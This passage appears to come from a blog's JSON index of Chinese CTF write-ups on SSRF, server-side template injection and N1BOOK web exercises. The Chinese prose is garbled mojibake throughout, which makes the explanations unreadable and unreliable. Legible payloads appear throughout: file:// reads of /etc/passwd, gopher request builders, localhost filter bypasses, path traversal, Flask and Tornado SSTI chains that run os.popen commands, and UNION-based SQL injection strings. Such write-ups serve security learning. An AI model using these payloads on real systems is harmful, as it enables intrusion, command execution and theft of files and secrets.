â€¦â€¦ä¸Šè¿°å‡½æ•°çš„ä¸å½“ä½¿ç”¨ä»¥åŠPHPåŸç”Ÿç±»SoapClientåœ¨è§¦å‘ååºåˆ—åŒ–æ—¶éƒ½å¯å¯¼è‡´SSRFã€‚ æ¼æ´å±å®³ å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœåŠ¡å™¨æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„bannerä¿¡æ¯ç­‰ã€‚ æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœåŠ¡å™¨æœ¬åœ°çš„å…¶ä»–åº”ç”¨ç¨‹åºï¼Œå¦‚redisã€mysqlç­‰ã€‚ å¯¹å†…ç½‘Webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œè¯†åˆ«ä¼ä¸šå†…éƒ¨çš„èµ„äº§ä¿¡æ¯ã€‚ æ”»å‡»å†…å¤–ç½‘çš„Webåº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨HTTP GET/POSTè¯·æ±‚å°±å¯ä»¥å®ç°çš„æ”»å‡»ï¼Œå¦‚sqlæ³¨å…¥ã€æ–‡ä»¶ä¸Šä¼ ç­‰ã€‚ åˆ©ç”¨fileåè®®è¯»å–æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ç­‰ã€‚ è¿›è¡Œè·³æ¿æ”»å‡»ç­‰ã€‚ ssrfæŒ–æ˜ webåŠŸèƒ½ ç¤¾äº¤åˆ†äº«åŠŸèƒ½ï¼šè·å–è¶…é“¾æ¥çš„æ ‡é¢˜ç­‰å†…å®¹è¿›è¡Œæ˜¾ç¤º è½¬ç æœåŠ¡ï¼šé€šè¿‡URLåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•æµè§ˆ åœ¨çº¿ç¿»è¯‘ï¼šç»™ç½‘å€ç¿»è¯‘å¯¹åº”ç½‘é¡µçš„å†…å®¹ å›¾ç‰‡åŠ è½½/ä¸‹è½½ï¼šä¾‹å¦‚å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ä¸­çš„ç‚¹å‡»ä¸‹è½½å›¾ç‰‡åˆ°æœ¬åœ°ã€é€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡ å›¾ç‰‡/æ–‡ç« æ”¶è—åŠŸèƒ½ï¼šä¸»è¦å…¶ä¼šå–URLåœ°å€ä¸­titleä»¥åŠæ–‡æœ¬çš„å†…å®¹ä½œä¸ºæ˜¾ç¤ºä»¥æ±‚ä¸€ä¸ªå¥½çš„ç”¨å…·ä½“éªŒ äº‘æœåŠ¡å‚å•†ï¼šå®ƒä¼šè¿œç¨‹æ‰§è¡Œä¸€äº›å‘½ä»¤æ¥åˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜æ´»ç­‰ï¼Œæ‰€ä»¥å¦‚æœå¯ä»¥æ•è·ç›¸åº”çš„ä¿¡æ¯ï¼Œå°±å¯ä»¥è¿›è¡Œ URLå…³é”®å­—shareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€3gã€displayã€sourceURLã€imageURLã€domainç­‰ åˆ©ç”¨æ–¹å¼SSRFçš„åˆ©ç”¨ä¸»è¦å°±æ˜¯è¯»å–å†…ç½‘æ–‡ä»¶ã€æ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»ã€æ‰«æå†…ç½‘ç«¯å£ã€æ”»å‡»å†…ç½‘å…¶ä»–åº”ç”¨ç­‰ï¼Œè€Œè¿™äº›åˆ©ç”¨çš„æ‰‹æ³•æ— ä¸€ä¸ä¸åè®®æ¯æ¯ç›¸å…³ã€‚ SSRFå¸¸ç”¨åˆ°çš„åè®®æœ‰ï¼š fileåè®®ï¼š åœ¨æœ‰å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ file åè®®å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶çš„å†…å®¹ dictåè®®ï¼šæ³„éœ²å®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç«¯å£ï¼Œæ“ä½œå†…ç½‘redisæœåŠ¡ç­‰ http(s)åè®®ï¼šæ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´» gopheråè®®ï¼šgopheræ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ã€‚å¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­ä¸€ä¸ªæœ€å¼ºå¤§çš„åè®®(ä¿—ç§°ä¸‡èƒ½åè®®)ã€‚å¯ç”¨äºåå¼¹shell fileåè®®æ„é€ å¦‚ä¸‹payloadï¼Œå®ç°è¯»å–æœåŠ¡å™¨ä¸Šçš„æœ¬åœ°æ–‡ä»¶åŠç½‘ç«™æºç ï¼š 12?url=file:///etc/passwd?url=file:///var/www/html/index.php dictåè®®æˆ‘ä»¬å¯ä»¥åˆ©ç”¨dictåè®®æ„é€ payloadæŸ¥çœ‹å†…ç½‘ä¸»æœºä¸Šå¼€æ”¾çš„ç«¯å£åŠç«¯å£ä¸Šè¿è¡ŒæœåŠ¡çš„ç‰ˆæœ¬ä¿¡æ¯ç­‰ï¼Œä¾‹å¦‚redisã€httpã€sshç­‰ï¼š 1?url=http://192.168.255.255:80/info å‡ºç°ä»€ä¹ˆçš„æŠ¥é”™å°±è¯´æ˜è¯¥ä¸»æœºä¸Šæœ‰ä»€ä¹ˆæœåŠ¡ã€‚ http(s)åè®®å…ˆè¯»å–è¯»å–/etc/hostsã€/proc/net/arpã€/proc/net/fib_trieç­‰æ–‡ä»¶è·å¾—ç›®æ ‡ä¸»æœºçš„ç½‘ç»œé…ç½®ä¿¡æ¯ï¼Œä»¥è·å¾—ç›®æ ‡ä¸»æœºå†…ç½‘ç½‘æ®µå¹¶è¿›è¡Œçˆ†ç ´ã€‚å†…ç½‘æ®µIPåˆ†ä¸ºä¸‰ç±»ï¼š Aç±»ï¼š10.0.0.0 - 10.255.255.255 Bç±»ï¼š172.16.0.0 - 172.31.255.255 Cç±»ï¼š192.168.0.0 - 192.168.255.255 ä½¿ç”¨bpçˆ†ç ´æˆ–æ„å»ºpayloadé€šè¿‡æœåŠ¡å™¨å‘é€è¯·æ±‚æ£€æµ‹å†…ç½‘å­˜æ´»ä¸»æœºï¼š 1?url=http://192.168.255.255 Gopheråè®®Gopheråè®®æ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼Œæ˜¯SSRFä¸­æœ€é‡è¦çš„åˆ©ç”¨åè®®ä¹‹ä¸€ã€‚æˆ‘ä»¬å¯ä»¥æˆªè·è¯·æ±‚åŒ…ï¼Œå†ä¿®æ”¹æ„å»ºæˆç¬¦åˆGopheråè®®æ ¼å¼çš„payloadï¼Œæ”»å‡»é¢ååˆ†ä¹‹å¹¿ã€‚payloadå¦‚ä¸‹ï¼š 1234?url=gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_TCPæµ//gopherçš„é»˜è®¤ç«¯å£æ˜¯70//å¦‚æœå‘èµ·POSTè¯·æ±‚ï¼Œå›è½¦æ¢è¡Œéœ€è¦ä½¿ç”¨%0d%0aæ¥ä»£æ›¿%0aï¼Œå¦‚æœå¤šä¸ªå‚æ•°ï¼Œå‚æ•°ä¹‹é—´çš„&amp;ä¹Ÿéœ€è¦è¿›è¡ŒURLç¼–ç  æƒ³è¦æ„é€ åˆæ³•payloadï¼Œå¯ä»¥åˆ©ç”¨ä¸‹é¢çš„è„šæœ¬è¿›è¡Œæ”¹å†™ï¼š 12345678import urllib.parsepayload =\\&quot;&quot;&quot;head payload&quot;&quot;&quot; tmp = urllib.parse.quote(payload)new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)result = &#x27;gopher://url/&#x27;+&#x27;_&#x27;+newprint(result) è¦æ³¨æ„ï¼š é—®å·éœ€è¦è½¬ç ä¸ºURLç¼–ç ï¼Œä¹Ÿå°±æ˜¯%3f å›è½¦æ¢è¡Œè¦å˜ä¸º%0d%0a,ä½†å¦‚æœç›´æ¥ç”¨å·¥å…·è½¬ åœ¨HTTPåŒ…çš„æœ€åè¦åŠ %0d%0aï¼Œä»£è¡¨æ¶ˆæ¯ç»“æŸ bypass åŸºæœ¬èº«ä»½è®¤è¯ç»•è¿‡å¦‚æœç›®æ ‡ä»£ç é™åˆ¶è®¿é—®çš„åŸŸååªèƒ½ä¸ºhttp://www.hack.comï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é‡‡ç”¨HTTPåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡ã€‚å³@ï¼šhttp://www.xxx.com@www.mrl64.com 302è·³è½¬å¦‚æœè¦æ±‚ä»æœ¬åœ°è®¿é—®ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨xip.ioï¼Œå½“è®¿é—®è¿™ä¸ªæœåŠ¡çš„ä»»æ„å­åŸŸåçš„æ—¶å€™ï¼Œéƒ½ä¼šé‡å®šå‘åˆ°è¿™ä¸ªå­åŸŸåã€‚ä¾‹å¦‚ï¼Œå½“æˆ‘ä»¬è®¿é—®http://127.0.0.1.xip.io/flag.phpæ—¶ï¼Œå®é™…è®¿é—®çš„æ˜¯http://127.0.0.1/1.phpã€‚è¿™æ ·çš„ç½‘å€è¿˜æœ‰http://nip.ioå’Œhttp://sslip.ioã€‚ æˆ–è€…ä½¿ç”¨çŸ­åœ°å€ï¼Œhttps://4m.cn/å¯¹åº”çš„çŸ­åœ°å€å³ä¸ºæœ¬åœ°ï¼Œä¾‹å¦‚ https://4m.cn/FjOdQå°±ä¼šè‡ªåŠ¨302è·³è½¬åˆ°http://127.0.0.1/flag.phpä¸Šã€‚ è¿›åˆ¶ç»•è¿‡åˆ©ç”¨ipåœ°å€çš„è¿›åˆ¶å˜åŒ–ï¼Œç»•è¿‡ï¼Œè¿™é‡Œæä¾›ä¸€ä¸ªåœ¨çº¿å·¥å…·ä¸è„šæœ¬ï¼šIPåœ°å€è¿›åˆ¶è½¬åŒ– è„šæœ¬ï¼š 1234567891011121314&lt;?php$ip = &#x27;127.0.0.1&#x27;;$ip = explode(&#x27;.&#x27;,$ip);$r = ($ip[0] &lt;&lt; 24) | ($ip[1] &lt;&lt; 16) | ($ip[2] &lt;&lt; 8) | $ip[3] ;if($r &lt; 0) &#123;$r += 4294967296;&#125;echo &quot;int:&quot;; // 2130706433echo $r;echo &quot;oct:&quot;; // 0177.0.0.1echo decoct($r);echo &quot;hex:&quot;; // 0x7f.0.0.1echo dechex($r);?&gt; è¿˜æœ‰å…¶ä»–æŒ‡å‘æœ¬åœ°çš„åœ°å€ï¼š 12345678http://localhost/ http://0/ //0åœ¨windowä¸‹ä»£è¡¨0.0.0.0ï¼Œè€Œåœ¨liunxä¸‹ä»£è¡¨127.0.0.1http://[0:0:0:0:0:ffff:127.0.0.1]/ //åœ¨liunxä¸‹å¯ç”¨http://[::]:80/ //åœ¨liunxä¸‹å¯ç”¨http://127ã€‚0ã€‚0ã€‚1/ http://â‘ â‘¡â‘¦.â“ª.â“ª.â‘ http://127.1/http://127.00000.00000.001/ ç›®å½•ç©¿è¶ŠPHPçš„file_get_contents()åœ¨é‡åˆ°ä¸è®¤è¯†çš„åè®®å¤´æ—¶å€™ä¼šå°†è¿™ä¸ªåè®®å¤´å½“åšæ–‡ä»¶å¤¹ï¼Œé€ æˆç›®å½•ç©¿è¶Šæ¼æ´ï¼Œè¿™ä¸ªæ–¹æ³•å¯ä»¥åœ¨SSRFçš„ä¼—å¤šåè®®è¢«ç¦æ­¢ä¸”åªèƒ½ä½¿ç”¨å®ƒè§„å®šçš„æŸäº›åè®®çš„æƒ…å†µä¸‹æ¥è¿›è¡Œè¯»å–æ–‡ä»¶ã€‚ ä¾‹å¦‚ï¼š 1?url=httpssss://../../../../etc/passwd urlè§£æ(1)readfileå’Œparse_urlå‡½æ•°çš„è§£æå·®å¼‚å¦‚æœåç«¯ç”¨parse_urlé™åˆ¶æˆ‘ä»¬ä¼ é€’urlçš„ç«¯å£ï¼Œä¾‹å¦‚é™å®šäº†80ï¼Œè€Œæˆ‘ä»¬æƒ³è¦è¯»å–9999ç«¯å£ä¸­çš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·æ„å»ºpayloadï¼š1?url=http://127.0.0.1:9999:80/ è¿™æ˜¯å› ä¸ºreadfile()è·å–çš„ç«¯å£æ˜¯æœ€åå†’å·å‰é¢çš„ä¸€éƒ¨åˆ†ï¼Œè€Œparse_url()è·å–çš„åˆ™æ˜¯æœ€åå†’å·åé¢çš„çš„ç«¯å£ï¼Œåˆ©ç”¨è¿™ç§å·®å¼‚çš„ä¸åŒï¼Œä»è€Œç»•è¿‡WAFã€‚ åŒæ ·è¿™ä¸¤ä¸ªå‡½æ•°å¯¹hostçš„è§£æä¹Ÿæ˜¯ä¸åŒçš„ï¼Œreadfile()è·å–çš„æ˜¯@å·åé¢ä¸€éƒ¨åˆ†ï¼Œè€Œparse_url()è·å–çš„åˆ™æ˜¯@å·å‰é¢çš„ä¸€éƒ¨åˆ†ï¼Œåˆ©ç”¨è¿™ç§å·®å¼‚çš„ä¸åŒï¼Œæˆ‘ä»¬å¯ä»¥ç»•è¿‡é¢˜ç›®ä¸­parse_url()å‡½æ•°å¯¹æŒ‡å®šhostçš„é™åˆ¶ã€‚ (2)curlå’Œparse_urlçš„è§£æå·®å¼‚è¿™ä¸¤ä¸ªå‡½æ•°ä¸»è¦é’ˆå¯¹hostè§£æä¸Šçš„å·®å¼‚ï¼Œcurl()è§£æçš„æ˜¯ç¬¬ä¸€ä¸ª@åé¢çš„ç½‘å€ï¼Œè€Œparse_url()è§£æçš„æ˜¯ç¬¬äºŒä¸ª@åé¢çš„ç½‘å€ã€‚åˆ©ç”¨è¿™ä¸ªåŸç†æˆ‘ä»¬å¯ä»¥ç»•è¿‡é¢˜ç›®ä¸­parse_url()å¯¹æŒ‡å®šhostçš„é™åˆ¶ã€‚ 1?url=http://foo@hack.com:80@mrl64.com æ€»ç»“SSRFä¹Ÿæ˜¯webä¸­çš„ä¸€ä¸ªç»å…¸è€ƒç‚¹äº†ï¼Œé€šè¿‡SSRFå¯ä»¥å¯¹å†…ç½‘çš„Redisã€FastCGIã€Mysqlç­‰å‘èµ·æ”»å‡»ã€‚ä¹‹åé‡åˆ°æ–°çš„é¢˜å‹ä¼šç»§ç»­è¡¥å……ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -ssrf","slug":"web-ssrf","permalink":"http://example.com/tags/web-ssrf/"}]},{"title":"sstiæ¨¡æ¿æ³¨å…¥","slug":"sstiæ¨¡æ¿æ³¨å…¥","date":"2022-01-20T04:41:44.000Z","updated":"2022-01-20T10:58:36.345Z","comments":true,"path":"2022/01/20/sstiæ¨¡æ¿æ³¨å…¥/","link":"","permalink":"http://example.com/2022/01/20/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","excerpt":"å‰è¨€å•Šå“ˆå“ˆå“ˆå“ˆï¼Œsstiï¼Œä¸ç©é˜´çš„ï¼Œç›´æ¥æ¥å§ã€‚","text":"å‰è¨€å•Šå“ˆå“ˆå“ˆå“ˆï¼Œsstiï¼Œä¸ç©é˜´çš„ï¼Œç›´æ¥æ¥å§ã€‚ ä»€ä¹ˆæ˜¯æ¨¡æ¿æ¨¡æ¿å¼•æ“ç”¨äºä½¿ç”¨åŠ¨æ€æ•°æ®å‘ˆç°å†…å®¹ã€‚æ­¤ä¸Šä¸‹æ–‡æ•°æ®é€šå¸¸ç”±ç”¨æˆ·æ§åˆ¶å¹¶ç”±æ¨¡æ¿è¿›è¡Œæ ¼å¼åŒ–ï¼Œä»¥ç”Ÿæˆç½‘é¡µã€ç”µå­é‚®ä»¶ç­‰ã€‚æ¨¡æ¿å¼•æ“é€šè¿‡ä½¿ç”¨ä»£ç æ„é€ ï¼ˆå¦‚æ¡ä»¶è¯­å¥ã€å¾ªç¯ç­‰ï¼‰å¤„ç†ä¸Šä¸‹æ–‡æ•°æ®ï¼Œå…è®¸åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨å¼ºå¤§çš„è¯­è¨€è¡¨è¾¾å¼ï¼Œä»¥å‘ˆç°åŠ¨æ€å†…å®¹ã€‚ ä»€ä¹ˆæ˜¯sstiï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰å½“å‰ä½¿ç”¨çš„ä¸€äº›æ¡†æ¶å·²ç»å½¢æˆäº†éå¸¸æˆç†Ÿçš„MVCçš„æ¨¡å¼ï¼Œç”¨æˆ·çš„è¾“å…¥å…ˆè¿›å…¥Controlleræ§åˆ¶å™¨ï¼Œç„¶åæ ¹æ®è¯·æ±‚ç±»å‹å’Œè¯·æ±‚çš„æŒ‡ä»¤å‘é€ç»™å¯¹åº”Modelä¸šåŠ¡æ¨¡å‹è¿›è¡Œä¸šåŠ¡é€»è¾‘åˆ¤æ–­ï¼Œæ•°æ®åº“å­˜å–ï¼Œæœ€åæŠŠç»“æœè¿”å›ç»™Viewè§†å›¾å±‚ï¼Œç»è¿‡æ¨¡æ¿æ¸²æŸ“å±•ç¤ºç»™ç”¨æˆ·ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶è¦å‘ˆç°çš„æ¨¡æ¿ï¼Œåˆ™ä»–ä»¬å°†èƒ½å¤Ÿæ³¨å…¥å¯æš´éœ²ä¸Šä¸‹æ–‡æ•°æ®ï¼Œç”šè‡³åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œä»»æ„å‘½ä»¤çš„è¡¨è¾¾å¼ã€‚æ¼æ´æˆå› å°±æ˜¯æœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„æ¶æ„è¾“å…¥ä»¥åï¼Œæœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸º Web åº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œæ¨¡æ¿å¼•æ“åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ’å…¥çš„å¯ä»¥ç ´åæ¨¡æ¿çš„è¯­å¥ã€‚å‡¡æ˜¯å­˜åœ¨ä½¿ç”¨æ¨¡æ¿çš„åœ°æ–¹éƒ½æœ‰å¯èƒ½å­˜åœ¨sstiã€‚ å¸¸è§æ¨¡æ¿å¼•æ“æ±‡æ€»åŠtagphp Smartyï¼š&#123;php&#125;payload;&#123;/php&#125;ã€&#123;payload&#125;ã€&#123;if payload&#125;&#123;/if&#125; Twigï¼š&#123;&#123;payload&#125;&#125; Blade:è¯¦è§Bladeæ¨¡æ¿å¼•æ“ Java FreeMarkerï¼š$&#123;payload&#125;ã€&lt;#payload&gt; velocity:#set($x=payload)$&#123;x&#125; Python Flask/Jinja2:&#123;&#123;payload&#125;&#125; Tornado:&#123;&#123;payload&#125;&#125;ã€&#123;% import os %&#125;&#123;&#123; os.popen(\"whoami\").read() &#125;&#125; Django:&#123;&#123;payload&#125;&#125;ã€&#123;%payload%&#125; æ”»å‡»æ€è·¯æˆ‘ä»¬è¿›è¡Œsstiï¼Œç›®çš„ä¸€èˆ¬éƒ½æ˜¯ä¸ºäº†åˆ›å»ºå¯¹è±¡ã€æ–‡ä»¶è¯»å†™ã€è¿œç¨‹æ–‡ä»¶åŒ…å«ã€ä¿¡æ¯æ³„æ¼ã€ææƒç­‰ç­‰ã€‚ä¸ºäº†è¾¾æˆç›®çš„ï¼Œæˆ‘ä»¬å¿…é¡»æ‰¾åˆ°é€‚å½“çš„æ³¨å…¥ç‚¹è¿›è¡Œæ”»å‡»ã€‚é¦–å…ˆå¯»æ‰¾æ¨¡æ¿æœ¬èº«æ”¯æŒçš„è¯­æ³•ã€å†…ç½®çš„å˜é‡ã€å±æ€§ã€å‡½æ•°ç­‰ç­‰ï¼Œæ¥ç€æ˜¯æ¡†æ¶çš„å…¨å±€å˜é‡ã€å‡½æ•°ã€å±æ€§ç­‰ï¼Œå†ç„¶åæˆ‘ä»¬è€ƒè™‘è¯­è¨€æœ¬èº«çš„ç‰¹æ€§ï¼Œæœ€åä»¥ä¸Šéƒ½ä¸è¡Œçš„æƒ…å†µä¸‹å†è€ƒè™‘åº”ç”¨æœ¬èº«å­˜åœ¨çš„å˜é‡ã€‚ [æŠ¤ç½‘æ¯ 2018]easy_tornadoè¿™é¢˜çš„éš¾ç‚¹ä¸åœ¨sstiä¸Šã€‚é¦–å…ˆè¿›å…¥é¢˜ç›®ä¸‰ä¸ªæ–‡ä»¶ï¼Œç¬¬ä¸€ä¸ªå‘Šè¯‰æˆ‘ä»¬flagçš„æ–‡ä»¶åç§°ï¼Œç¬¬äºŒä¸ªæç¤ºæˆ‘ä»¬renderï¼Œç¬¬ä¸‰ä¸ªç»™æˆ‘ä»¬ä¸€ä¸²åŠ å¯†é€»è¾‘: 1md5(cookie_secret+md5(filename)) æˆ‘ä»¬è§‚å¯Ÿurlä¸éš¾å‘ç°è¿™ä¸ªåŠ å¯†é€»è¾‘åº”è¯¥æ˜¯filehashçš„é€»è¾‘ï¼Œè€Œæˆ‘ä»¬åªè¦å°†/fllllllllllllagå¯¹åº”çš„filehashç®—å‡ºæ¥å°±å¯ä»¥äº†ã€‚ä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªcookie_secretï¼Œç»“åˆæç¤ºrenderï¼Œrenderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µrenderé…åˆTornadoä½¿ç”¨ï¼Œæˆ‘ä»¬çŒœæµ‹è¿™é‡Œæœ‰ä¸€ä¸ªsstiã€‚éšæ„æ›´æ”¹urlè¿›å…¥errorç•Œé¢ï¼Œæˆ‘ä»¬å‘ç°urlä¸­æœ‰msgå‚æ•°ï¼Œè¿›è¡Œæ¨¡æ¿æµ‹è¯•ï¼š å­˜åœ¨sstiï¼Œæˆ‘ä»¬å°†msgæ”¹ä¸ºè·å–cookie_secretï¼š æœ€åç¼–å†™è„šæœ¬è·å–filehashï¼š 123456789101112import hashlibhash = hashlib.md5()filename=&#x27;/fllllllllllllag&#x27;cookie_secret=&quot;6cd6901e-7485-435e-a8f7-aef19adf1227&quot;hash.update(filename.encode(&#x27;utf-8&#x27;))s1=hash.hexdigest()hash = hashlib.md5()hash.update((cookie_secret+s1).encode(&#x27;utf-8&#x27;))print(hash.hexdigest())//582be1f6041bc39f2fdbed73bf1196fe æœ€åæ„å»ºurlè·å–flagï¼š [Flask]SSTIé€šè¿‡æŸ¥è¯¢æºç å‘ç°å­˜åœ¨sstiï¼š 12345678&lt;html&gt; &lt;head&gt; &lt;title&gt;&#123;&#123;title&#125;&#125;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello, &#123;&#123;name&#125;&#125; !&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt; GETä¸€ä¸ªnameå‚æ•°æµ‹è¯•ï¼Œå‘ç°ç¡®å®å­˜åœ¨sstiï¼š æ ¹æ®é¢˜ç›®åˆ¤æ–­è¿™æç¤ºflask sstiï¼Œé‚£ä¹ˆå…ˆè·å–å­ç±»åï¼š 1?name=&#123;&#123;[].__class__.__bases__[0].__subclasses__()&#125;&#125; æ¥ç€æŸ¥çœ‹æºç è·å–å­ç±»ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾çš„å¤§æ¦‚æ˜¯ä»¥ä¸‹ä¸‰ç±»ï¼šä¸€æ˜¯fileæ¨¡å—ä¸­çš„readåŠŸèƒ½ï¼Œç”¨æ¥è¯»å–å„ç§æ–‡ä»¶ï¼Œæ•æ„Ÿä¿¡æ¯ç­‰ã€‚äºŒæ˜¯warnings.catch_warnings(éœ€è‡ªå·±å¯¼å…¥osæ¨¡å—)ã€socket._socketobject(éœ€è‡ªå·±å¯¼å…¥osæ¨¡å—)ã€site._Printerã€site.Quitterç­‰æ¨¡å—çš„å†…ç½®osï¼Œé€šè¿‡osæ¨¡å—æˆ‘ä»¬å¯ä»¥åšåˆ°systemæ‰§è¡Œå‘½ä»¤ï¼ˆsystemæ‰§è¡ŒæˆåŠŸè¿”å›0ï¼Œä¸ä¼šåœ¨é¡µé¢æ˜¾ç¤ºã€‚ï¼‰ã€popenç®¡é“è¯»å–æ–‡ä»¶ã€listdiråˆ—ç›®å½•ç­‰æ“ä½œã€‚ä¸‰æ˜¯get_flashed_messages() è·å–é—ªç°ä¿¡æ¯ å†™è„šæœ¬æ¥è·å–å­ç±»ï¼š 12345678910111213141516def find(): list = &quot;&quot; list = list.replace(&#x27;\\&#x27;&#x27;,&#x27;&#x27;) list = list.replace(&#x27;&lt;&#x27;,&#x27;&#x27;) list = list.replace(&#x27;&gt;&#x27;,&#x27;&#x27;) list = list.replace(&#x27;class &#x27;,&#x27;&#x27;) list = list.replace(&#x27;enum &#x27;,&#x27;&#x27;) list = list.replace(&#x27;type &#x27;,&#x27;&#x27;) list = list.replace(&#x27; &#x27;,&#x27;&#x27;) list = list.split(&#x27;,&#x27;) print(list) className = &#x27;warnings.catch_warnings&#x27; #éœ€è¦æŸ¥æ‰¾çš„æ¨¡å—åç§° num = list.index(className) print(num) #è¿”å›ç´¢å¼•if __name__ == &#x27;__main__&#x27;: find() æ‰¾åˆ°ä½ç½®ä¸º166ï¼Œæ¥ç€æŸ¥è¯¢å…¨å±€å˜é‡ï¼š 1?name=&#123;&#123;[].__class__.__bases__[0].__subclasses__()[166].__init__.__globals__&#125;&#125; å‘ç°OSErrorï¼Œè¯´æ˜å¯ä»¥è‡ªå·±å¯¼å…¥osæ¨¡å—ï¼Œæœ¬æ¥ä»¥ä¸ºæ˜¯cat /flagï¼ŒæŸ¥äº†wpæ‰å‘ç°æ˜¯åœ¨ç¯å¢ƒå˜é‡ä¸­ï¼š 1&#123;&#123;[].__class__.__bases__[0].__subclasses__()[166].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;)&#125;&#125;","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -ssti","slug":"web-ssti","permalink":"http://example.com/tags/web-ssti/"}]},{"title":"ã€N1BOOKç¬¬ä¸€ç« ã€‘webåŸºç¡€ç»ƒä¹ ","slug":"ã€N1BOOKç¬¬ä¸€ç« ã€‘webåŸºç¡€ç»ƒä¹ ","date":"2022-01-18T06:23:53.000Z","updated":"2022-01-18T09:37:25.086Z","comments":true,"path":"2022/01/18/ã€N1BOOKç¬¬ä¸€ç« ã€‘webåŸºç¡€ç»ƒä¹ /","link":"","permalink":"http://example.com/2022/01/18/%E3%80%90N1BOOK%E7%AC%AC%E4%B8%80%E7%AB%A0%E3%80%91web%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0/","excerpt":"å‰è¨€åšbuuæ—¶å‘ç°è¿˜æœ‰è¿™ä¸ªæ¨¡å—ï¼Œæ„Ÿè§‰æŒºä¸é”™çš„ï¼Œåšäº†ä¹Ÿå°±è®°å½•ä¸‹ã€‚","text":"å‰è¨€åšbuuæ—¶å‘ç°è¿˜æœ‰è¿™ä¸ªæ¨¡å—ï¼Œæ„Ÿè§‰æŒºä¸é”™çš„ï¼Œåšäº†ä¹Ÿå°±è®°å½•ä¸‹ã€‚ å¸¸è§çš„æœé›†ç›´æ¥ä¸Šdirsearchæˆ–è€…å¾¡å‰‘è·‘ï¼Œè·‘å‡º3ä¸ª200é€šé“ï¼Œåˆ†åˆ«æ˜¯robots.txtï¼Œindex.php~ä»¥åŠ.index.php.swpï¼Œåˆ†åˆ«è®¿é—®è¿™ä¸‰ä¸ªé€šé“ï¼š ç»„åˆflagï¼šn1book{info_1s_v3ry_imp0rtant_hack} å½“vimå‡ºç°å¼‚å¸¸ä¼šäº§ç”Ÿ.swpæ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡vim -r .index.php.swpæ¢å¤æ–‡ä»¶ ç²—å¿ƒçš„å°ææç¤ºgitæ³„éœ²ï¼Œé‚£å°±ç›´æ¥ä¸Šgithackè·‘å‡ºæ¥å°±å¯ä»¥äº†ï¼š flagï¼šn1book{git_looks_s0_easyfun} SQLæ³¨å…¥-1æœ€ç®€å•çš„sqlé¢˜ï¼Œå†™ä¸‹è”åˆæ³¨å…¥çš„payloadå§ï¼š 1234567891011id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata--+//information_schema,mysql,note,performance_schemaid=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;note&#x27;--+//fl4g,notesid=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;note&#x27; and table_name=&#x27;fl4g&#x27;--+//fllllagid=-1&#x27; union select 1,2,group_concat(fllllag) from fl4g--+//n1book&#123;union_select_is_so_cool&#125; 